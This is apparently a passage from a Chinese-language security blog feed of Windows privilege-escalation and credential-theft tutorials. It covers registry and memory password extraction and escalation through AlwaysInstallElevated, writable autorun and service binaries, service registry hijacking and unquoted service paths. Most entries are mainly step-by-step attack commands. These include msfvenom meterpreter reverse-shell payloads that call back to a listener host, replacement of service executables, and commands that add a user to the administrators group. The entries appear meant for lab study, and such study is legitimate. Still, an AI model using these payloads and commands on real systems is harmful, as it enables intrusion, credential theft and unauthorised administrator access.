taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">3.<br>reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\S</span>imonTatham<span class="hljs-symbol">\P</span>uTTY<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\B</span>WP123F42 -v ProxyUsername<br>4.<br>reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\S</span>imonTatham<span class="hljs-symbol">\P</span>uTTY<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\B</span>WP123F42 -v ProxyPassword<br>5.<br>reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\T</span>ightVNC<span class="hljs-symbol">\S</span>erver /v Password<br>6.<br>reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\T</span>ightVNC<span class="hljs-symbol">\S</span>erver /v PasswordViewOnly<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\v</span>ncpwd<span class="hljs-symbol">\v</span>ncpwd.exe 加密后的密码<br>cmd面板 右键mark<br></code></pre></div></td></tr></table></figure><h2 id="编写注册表脚本自动登陆"><a href="#编写注册表脚本自动登陆" class="headerlink" title="编写注册表脚本自动登陆"></a>编写注册表脚本自动登陆</h2><figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript">Windows Registry Editor Version <span class="hljs-number">5.00</span><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]<br><span class="hljs-string">&quot;AutoAdminLogon&quot;</span>=<span class="hljs-string">&quot;1&quot;</span> <br><span class="hljs-string">&quot;DefaultUserName&quot;</span>=<span class="hljs-string">&quot;自动登陆的用户名&quot;</span><br><span class="hljs-string">&quot;DefaultDomainName&quot;</span>=<span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-string">&quot;DefaultPassword&quot;</span>=<span class="hljs-string">&quot;自动登陆的用户密码&quot;</span><br></code></pre></div></td></tr></table></figure><p>修改自动登陆的用户密码会发生什么？</p><h2 id="搜索注册表所有密码"><a href="#搜索注册表所有密码" class="headerlink" title="搜索注册表所有密码"></a>搜索注册表所有密码</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">reg query HKLM <span class="hljs-string">/f</span> passw <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/s</span><br>reg.exe query HKCU <span class="hljs-string">/f</span> passw <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/s</span><br></code></pre></div></td></tr></table></figure><h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><p>search post/windows/gather/credentials/windows_autologin</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存密码挖掘</title>
    <link href="/2020/02/19/11-x/"/>
    <url>/2020/02/19/11-x/</url>
    
    <content type="html"><![CDATA[<p>视频教程<a href="https://www.acfun.cn/v/ac13003593">地址</a></p><p>msfconsole -r pass.rc</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/<span class="hljs-keyword">capture</span>/http_basic<br><span class="hljs-keyword">set</span> uripath x<br><span class="hljs-keyword">run</span><br></code></pre></div></td></tr></table></figure><p>访问<a href="http://192.168.1.101/x">http://192.168.1.101/x</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">strings <span class="hljs-string">/root/Desktop/</span>*<span class="hljs-string">.DMP</span> | grep <span class="hljs-string">&quot;Authorization: Basic&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cXdmOnF3Zg==&quot;</span> | base64 -d<br></code></pre></div></td></tr></table></figure><h2 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h2><p>使用该脚本获取内存中的密码</p><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">ep</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">user</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Process</span> <span class="hljs-operator">-</span><span class="hljs-variable">Id</span> <span class="hljs-variable">pid</span> <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows本地提权之命名管道</title>
    <link href="/2020/02/18/02-x/"/>
    <url>/2020/02/18/02-x/</url>
    
    <content type="html"><![CDATA[<h1 id="windows本地提权之命名管道"><a href="#windows本地提权之命名管道" class="headerlink" title="windows本地提权之命名管道"></a>windows本地提权之命名管道</h1><p>参考资料:</p><ul><li><a href="https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation">windows-namedpipes-privilege-escalation</a></li><li><a href="https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/">what-happens-when-i-type-getsystem/</a></li><li><a href="https://metasploit.help.rapid7.com/docs/getsystem-command-work">https://metasploit.help.rapid7.com/docs/getsystem-command-work</a></li><li><a href="https://www.anquanke.com/post/id/87292">https://www.anquanke.com/post/id/87292</a></li></ul><p>视频教程地址：<a href="https://www.bilibili.com/video/av89777352">https://www.bilibili.com/video/av89777352</a></p><h2 id="命名管道是什么"><a href="#命名管道是什么" class="headerlink" title="命名管道是什么"></a>命名管道是什么</h2><p>命名管道是一个机制，可以使得应用程序和本地或远程的进程进行通信。<br>创建命名管道的应用程序称为“命名管道服务器”，连接命名管道的称为“命名管道客户端”。<br>与socket类似，在服务器创建命名管道后，管道客户端可以与服务器进行连接。</p><hr><p>命名管道的权限问题</p><ul><li>连接由安全解释器控制</li><li>ACL是命名管道默认的安全解释器，给本地系统用户，管理员，创建管道的拥有者完全的控制权限。<br>它也给了任何组的用户和匿名用户读权限。</li></ul><p>命名管道默认使用的是SMB协议来通信。</p><h2 id="列出所有命名管道"><a href="#列出所有命名管道" class="headerlink" title="列出所有命名管道"></a>列出所有命名管道</h2><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">powershell<br>[<span class="hljs-symbol">System.IO.Directory</span>]:<span class="hljs-link">:GetFiles(&quot;\\.\pipe\&quot;)</span><br></code></pre></div></td></tr></table></figure><h2 id="getsystem命令"><a href="#getsystem命令" class="headerlink" title="getsystem命令"></a>getsystem命令</h2><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">...<br><span class="hljs-keyword">Each</span> <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">of</span> <span class="hljs-title">elevation</span> <span class="hljs-title">in</span> `<span class="hljs-title">getsystem</span>` <span class="hljs-title">relies</span> <span class="hljs-title">on</span> <span class="hljs-title">the</span> <span class="hljs-title">process</span> <span class="hljs-title">having</span> <span class="hljs-title">certain</span> <span class="hljs-title">properties</span> <span class="hljs-title">or</span> <span class="hljs-title">permissions</span>. <span class="hljs-title">On</span> <span class="hljs-title">Windows</span> 7/8/8.1, `<span class="hljs-title">getsystem</span>` <span class="hljs-title">will</span> <span class="hljs-title">not</span> <span class="hljs-title">work</span> <span class="hljs-title">with</span> <span class="hljs-title">any</span> <span class="hljs-title">of</span> <span class="hljs-title">these</span> <span class="hljs-title">methods</span> <span class="hljs-title">because</span> <span class="hljs-title">the</span> <span class="hljs-title">operating</span> <span class="hljs-title">system</span> <span class="hljs-title">has</span> <span class="hljs-title">been</span> <span class="hljs-title">patched</span> <span class="hljs-title">to</span> <span class="hljs-title">avoid</span> <span class="hljs-title">these</span> <span class="hljs-title">flaws</span>.</span><br><span class="hljs-function">在网上摘抄了一段资料</span><br></code></pre></div></td></tr></table></figure><p>getsystem使用的就是命名管道提权的技术，该命令成功与否取决去进程的属性和权限。在win7 8 8.1 中，getsystem命令使用的三种方法提权方法都不会成功，因为系统已经避免了缺陷打上了补丁。</p><p>当我在win7 运行getsystem命令来提权的时候，提示<code>Operation failed: The environment is incorrect.</code></p><p>成功提权需要，1.用户权限具有adminitrator，2. windows版本小于win7。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe -o payload<span class="hljs-number">32</span>.exe<br><br><span class="hljs-attribute">whoami</span> /groups<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总是以管理员权限安装的提权</title>
    <link href="/2020/02/18/08-x/"/>
    <url>/2020/02/18/08-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<br><a href="https://hacknpentest.com/windows-privilege-escalation-via-alwaysinstallelevated-technique/">https://hacknpentest.com/windows-privilege-escalation-via-alwaysinstallelevated-technique/</a><br>视频<a href="https://www.bilibili.com/video/av89909371/">地址</a><br>作者注：跟linux中的suid权限有点像，某种应用程序，普通用户可以运行，并且程序有着管理员权限。</p><h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">reg query HKLM<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<br>reg query HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<br></code></pre></div></td></tr></table></figure><p>AlwaysInstallElevated是一项功能，可为Windows计算机上的所有用户（特别是低特权用户）提供运行任何具有提升特权的MSI文件的功能。 MSI是基于Microsoft的安装程序软件包文件格式，用于安装，存储和删除程序。</p><p>注意：此选项等效于授予完整的管理权限，这可能会带来巨大的安全风险。 Microsoft强烈建议不要使用此设置。</p><p>默认情况下，此选项是关闭的，要创建此特权升级入口点，我们需要将其打开，我们将在此博客中进一步介绍。</p><p>由于该功能允许所有用户以提升的权限运行msi文件，因此低特权用户确实可以运行恶意的msi文件，并且可以生成shell或将新创建的用户添加到Administrator组。</p><h2 id="使用powershell脚本发现漏洞"><a href="#使用powershell脚本发现漏洞" class="headerlink" title="使用powershell脚本发现漏洞"></a>使用powershell脚本发现漏洞</h2><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">ep</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">user</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">PowerUp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">RegistryAlwaysInstallElevated</span><br></code></pre></div></td></tr></table></figure><h2 id="生成载荷"><a href="#生成载荷" class="headerlink" title="生成载荷"></a>生成载荷</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 获得一个普通权限的shell">handler -H 192.168.1.101 -P 44555 -p windows/x64/meterpreter/reverse_tcp<br><br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=44555 -f exe -o payload.exe<br></code></pre></div></td></tr></table></figure><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 提权">use exploit/windows/local/always_install_elevated<br>show options<br>set session 1<br>set payload windows/x64/meterpreter/reverse_tcp<br>set lport 3344<br>set lhost 192.168.1.101<br>run<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可修改的自启程序提权</title>
    <link href="/2020/02/17/06-x/"/>
    <url>/2020/02/17/06-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://www.youtube.com/watch?v=4W35tw_Di8k&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=7">youtubu视频</a></li></ul><p>我的视频教程：<a href="https://www.bilibili.com/video/av89635859/">https://www.bilibili.com/video/av89635859/</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>可修改的自启程序</strong>提权是利用了自启程序权限不正确。<br>C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe<br>找到开机自启的程序</p><hr><p>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\Autorun Program”<br>发现该程序任何人都可读可写</p><h2 id="修改自启程序"><a href="#修改自启程序" class="headerlink" title="修改自启程序"></a>修改自启程序</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe -o program.exe<br><br><span class="hljs-attribute">C</span>:\Program Files\Autorun Program<br><span class="hljs-attribute">copy</span> /y c:\Temp\program.exe <span class="hljs-string">&quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></code></pre></div></td></tr></table></figure><p>重启目标机，即可得到shell。</p><p>要注意两点</p><ol><li>只有管理员登陆目标机器，才能获得反弹的shell，普通用户登入，修改后的自启程序会报错。</li><li>C:\Program Files\Autorun Program\program.exe 只能修改，不能删除原文件，再次新建（需要管理员权限）。</li></ol>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows本地提权服务之可执行文件</title>
    <link href="/2020/02/17/11-x/"/>
    <url>/2020/02/17/11-x/</url>
    
    <content type="html"><![CDATA[<h1 id="windows本地提权服务之可执行文件"><a href="#windows本地提权服务之可执行文件" class="headerlink" title="windows本地提权服务之可执行文件"></a>windows本地提权服务之可执行文件</h1><p>b站上的<a href="https://www.bilibili.com/video/av89502462">视频教程</a></p><p>漏洞原理是windows服务权限配置不当，任何人都可以<strong>修改</strong>服务的<strong>应用程序</strong>。将恶意代码复制到服务的应用程序末尾，重新启动该服务，即可利用漏洞。</p><h2 id="运行powershell脚本发现漏洞"><a href="#运行powershell脚本发现漏洞" class="headerlink" title="运行powershell脚本发现漏洞"></a>运行powershell脚本发现漏洞</h2><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">ep</span> <span class="hljs-variable">bypass</span><br><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">user</span>\<span class="hljs-variable">Desktop</span>\<span class="hljs-variable">PowerUp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ModifiableServiceFile</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">1.</span><span class="hljs-variable">txt</span><br><br></code></pre></div></td></tr></table></figure><p>查看运行结果1.txt</p><h2 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h2><p><code>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu &quot;C:\Program Files\File Permissions Service&quot;</code></p><p>RW everyone<br>说明任何人都有读写权限。</p><p>sc qc filepermsvc</p><h2 id="生成攻击载荷"><a href="#生成攻击载荷" class="headerlink" title="生成攻击载荷"></a>生成攻击载荷</h2><p>伪造服务应用程序</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe-service -o x.exe<br></code></pre></div></td></tr></table></figure><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>copy /y c:\Temp\x.exe “c:\Program Files\File Permissions Service\filepermservice.exe”</p><p>sc start filepermsvc</p><p>net localgroup administrators</p><h2 id="通过msf模块"><a href="#通过msf模块" class="headerlink" title="通过msf模块"></a>通过msf模块</h2><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">search windows/local/service_permissions<br>use <span class="hljs-number">0</span><br><span class="hljs-keyword">set</span> sessions <span class="hljs-comment">x</span> <br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.1.100</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4455</span><br>show <span class="hljs-comment">options</span><br>run<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows服务之注册表提权</title>
    <link href="/2020/02/16/05-x/"/>
    <url>/2020/02/16/05-x/</url>
    
    <content type="html"><![CDATA[<h1 id="windows服务之注册表提权"><a href="#windows服务之注册表提权" class="headerlink" title="windows服务之注册表提权"></a>windows服务之注册表提权</h1><p>b站上的<a href="https://www.bilibili.com/video/av89388181">视频教程</a></p><h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><p>NT Authority \ SYSTEM又称LocalSystem帐户是内置的Windows帐户。 它是Windows本地实例上功能最强大的帐户（比任何管理员帐户都更强大）。 大多数系统级别（Windows Services）服务和其他一些第三方服务都在帐户中运行</p><p>NT Authority \ SYSTEM 是Builtin\Administrator 是系统管理员之一</p><p>NT AUTHORITY\INTERACTIVE</p><p>交互式用户是当前登录到运行COM服务器的计算机的用户。 如果将身份设置为交互式用户，并且服务器将其类工厂注册为多用途，则所有客户端都将使用服务器的同一实例。</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">powershell<br>Get-Acl -Path hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | Format-List &gt; 1.txt<br><span class="hljs-section">查找1.txt “ NT AUTHORITY\INTERACTIVE ”</span><br><span class="hljs-section">---</span><br>powershell<br>Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl<br></code></pre></div></td></tr></table></figure><h2 id="生成伪造的服务"><a href="#生成伪造的服务" class="headerlink" title="生成伪造的服务"></a>生成伪造的服务</h2><p>编译windows_service.c</p><p>cmd.exe /k net localgroup administrators user /add</p><p>x86_64-w64-mingw32-gcc windows_service.c -o x.exe</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.1.100 <span class="hljs-attribute">LPORT</span>=4444 -f exe-service -o x.exe<br></code></pre></div></td></tr></table></figure><p>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f</p><p>sc start regsvc</p><p>net user user</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未打引号的路径&amp;windows本地提权</title>
    <link href="/2020/02/15/03-x/"/>
    <url>/2020/02/15/03-x/</url>
    
    <content type="html"><![CDATA[<p>我录制了一个演示<a href="https://www.bilibili.com/video/av88996589">视频</a></p><h2 id="meterpreter开启监听"><a href="#meterpreter开启监听" class="headerlink" title="meterpreter开启监听"></a>meterpreter开启监听</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe -o payload.exe<br><br><span class="hljs-attribute">search</span> trusted_service<br><span class="hljs-attribute">use</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">set</span> session <span class="hljs-number">1</span><br><span class="hljs-attribute">run</span><br></code></pre></div></td></tr></table></figure><h2 id="查看服务权限"><a href="#查看服务权限" class="headerlink" title="查看服务权限"></a>查看服务权限</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\A</span>ccesschk<span class="hljs-symbol">\a</span>ccesschk64.exe -wuvc unquotedsvc<br><br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\U</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\A</span>ccesschk<span class="hljs-symbol">\a</span>ccesschk64.exe /accepteula -uwcqv user *<br><br>sc qc unquotedsvc<br></code></pre></div></td></tr></table></figure><h2 id="生成伪造的服务"><a href="#生成伪造的服务" class="headerlink" title="生成伪造的服务"></a>生成伪造的服务</h2><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">msfvenom -p windows/exec <span class="hljs-attr">CMD=</span>&#x27;net localgroup administrators <span class="hljs-keyword">user</span> <span class="hljs-title">/add</span>&#x27; -f exe-service -o common.exe<br><br>sc <span class="hljs-literal">start</span> unquotedsvc<br>net localgroup administrators<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows-cmd用户管理命令</title>
    <link href="/2020/02/13/08-x/"/>
    <url>/2020/02/13/08-x/</url>
    
    <content type="html"><![CDATA[<h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><h3 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h3><p><code>net user 用户</code></p><h3 id="查看用户组"><a href="#查看用户组" class="headerlink" title="查看用户组"></a>查看用户组</h3><p><code>net localgroup administrators(用户组)</code></p><h2 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h2><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p><code>net user 用户名 密码 /add /expires:never</code></p><h3 id="添加用户密码"><a href="#添加用户密码" class="headerlink" title="添加用户密码"></a>添加用户密码</h3><p><code>net user Administrator 123456 /add </code></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h3><p><code>net user 用户名 密码</code></p><h3 id="添加-删除用户组中的用户"><a href="#添加-删除用户组中的用户" class="headerlink" title="添加/删除用户组中的用户"></a>添加/删除用户组中的用户</h3><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div 